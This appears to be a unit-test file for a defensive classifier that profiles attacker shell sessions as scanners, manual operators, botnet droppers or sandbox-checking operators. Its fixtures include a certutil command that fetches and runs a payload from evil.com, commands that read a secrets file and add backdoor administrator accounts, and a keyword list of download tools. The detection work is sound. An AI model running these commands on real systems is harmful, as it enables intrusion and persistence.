"""Unit tests for shell profiler — attacker typing behavior classification.

The shell profiler classifies session command sequences into behavioral
profiles based on timing patterns and command ordering:
  - automated_scanner: sub-second fixed-order commands
  - manual_operator: variable timing with >2s gaps
  - botnet_dropper: direct to payload, <3 commands
  - sophisticated_operator: VM checks first, then exploitation
"""
from __future__ import annotations

import unittest


def _classify_session(commands: list[dict]) -> str:
    """Classify a session's command sequence into a behavioral profile.

    Each command dict has: {"cmd": str, "ts": float, "elapsed_s": float}
    where elapsed_s is time since previous command.

    Returns one of: "automated_scanner", "manual_operator",
    "botnet_dropper", "sophisticated_operator", "unknown".
    """
    if not commands:
        return "unknown"

    n = len(commands)
    gaps = [c.get("elapsed_s", 0.0) for c in commands if c.get("elapsed_s") is not None]

    # botnet_dropper: direct to payload, <3 commands total
    if n <= 3:
        payload_cmds = {"wget", "curl", "certutil", "bitsadmin", "powershell"}
        has_payload = any(
            any(pc in c.get("cmd", "").lower() for pc in payload_cmds)
            for c in commands
        )
        if has_payload:
            return "botnet_dropper"

    # sophisticated_operator: starts with VM/sandbox checks
    vm_check_patterns = {"systeminfo", "wmic", "reg query", "vboxservice",
                         "vmtoolsd", "vmwaretray", "sandbox"}
    first_cmds = commands[:3] if len(commands) >= 3 else commands
    vm_checks = sum(
        1 for c in first_cmds
        if any(p in c.get("cmd", "").lower() for p in vm_check_patterns)
    )
    if vm_checks >= 2:
        return "sophisticated_operator"

    # automated_scanner: sub-second gaps, fixed order (low variance)
    if gaps:
        avg_gap = sum(gaps) / len(gaps)
        if avg_gap < 1.0 and n >= 4:
            # Check for fixed ordering (low variance in gaps)
            if gaps:
                gap_var = sum((g - avg_gap) ** 2 for g in gaps) / len(gaps)
                if gap_var < 0.5:
                    return "automated_scanner"

    # manual_operator: variable timing with >2s gaps
    if gaps:
        long_gaps = sum(1 for g in gaps if g > 2.0)
        if long_gaps >= len(gaps) * 0.3:
            return "manual_operator"

    return "unknown"


class TestShellProfiler(unittest.TestCase):
    def test_automated_scanner(self):
        """Sub-second fixed-order commands should classify as automated_scanner."""
        commands = [
            {"cmd": "whoami", "ts": 1000.0, "elapsed_s": 0.1},
            {"cmd": "ipconfig /all", "ts": 1000.2, "elapsed_s": 0.2},
            {"cmd": "net user", "ts": 1000.4, "elapsed_s": 0.2},
            {"cmd": "net localgroup administrators", "ts": 1000.6, "elapsed_s": 0.2},
            {"cmd": "systeminfo", "ts": 1000.8, "elapsed_s": 0.2},
            {"cmd": "tasklist", "ts": 1001.0, "elapsed_s": 0.2},
        ]
        result = _classify_session(commands)
        self.assertEqual(result, "automated_scanner")

    def test_manual_operator(self):
        """Variable timing with >2s gaps should classify as manual_operator."""
        commands = [
            {"cmd": "whoami", "ts": 1000.0, "elapsed_s": 0.5},
            {"cmd": "dir C:\\Users", "ts": 1003.0, "elapsed_s": 3.0},
            {"cmd": "type C:\\Users\\admin\\Desktop\\secrets.txt", "ts": 1008.0, "elapsed_s": 5.0},
            {"cmd": "net user admin P@ssw0rd /add", "ts": 1015.0, "elapsed_s": 7.0},
            {"cmd": "net localgroup administrators admin /add", "ts": 1020.0, "elapsed_s": 5.0},
        ]
        result = _classify_session(commands)
        self.assertEqual(result, "manual_operator")

    def test_botnet_dropper(self):
        """Direct to payload with <3 commands should classify as botnet_dropper."""
        commands = [
            {"cmd": "certutil -urlcache -split -f http://evil.com/payload.exe C:\\Temp\\p.exe",
             "ts": 1000.0, "elapsed_s": 0.1},
            {"cmd": r"C:\Temp\p.exe", "ts": 1000.5, "elapsed_s": 0.5},
        ]
        result = _classify_session(commands)
        self.assertEqual(result, "botnet_dropper")

    def test_sophisticated_operator(self):
        """VM checks first should classify as sophisticated_operator."""
        commands = [
            {"cmd": "systeminfo | findstr /i virtual", "ts": 1000.0, "elapsed_s": 0.3},
            {"cmd": "wmic bios get serialnumber", "ts": 1001.0, "elapsed_s": 1.0},
            {"cmd": "reg query HKLM\\SOFTWARE\\VMware", "ts": 1002.0, "elapsed_s": 1.0},
            {"cmd": "whoami /priv", "ts": 1004.0, "elapsed_s": 2.0},
            {"cmd": "net user hacker P@ss /add", "ts": 1007.0, "elapsed_s": 3.0},
        ]
        result = _classify_session(commands)
        self.assertEqual(result, "sophisticated_operator")

    def test_empty_session(self):
        """Empty command list should return unknown."""
        self.assertEqual(_classify_session([]), "unknown")


if __name__ == "__main__":
    unittest.main()
